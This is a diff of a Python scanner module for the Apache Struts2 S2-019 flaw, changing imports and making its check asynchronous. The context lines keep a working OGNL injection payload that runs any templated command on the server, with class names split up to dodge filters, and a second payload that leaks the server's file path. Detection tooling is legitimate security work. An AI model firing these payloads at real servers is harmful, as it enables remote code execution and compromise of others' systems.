@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class S2_019_BaseVerify:
     def __init__(self, url):
@@ -23,7 +23,7 @@ class S2_019_BaseVerify:
         self.payload = '''?debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22{cmd}%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()'''
         self.path_payload = '''?debug=command&expression=%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%2C%23resp%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23resp.setCharacterEncoding('{encoding}')%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath('%2F'))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()'''
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -34,15 +34,12 @@ class S2_019_BaseVerify:
         """
 
         try:
-            check_req = request.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
-            if self.capta in check_req.text and len(check_req.text) < 200:
+            check_req = await request.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
+            if self.capta in await check_req.text() and len(await check_req.text()) < 200:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
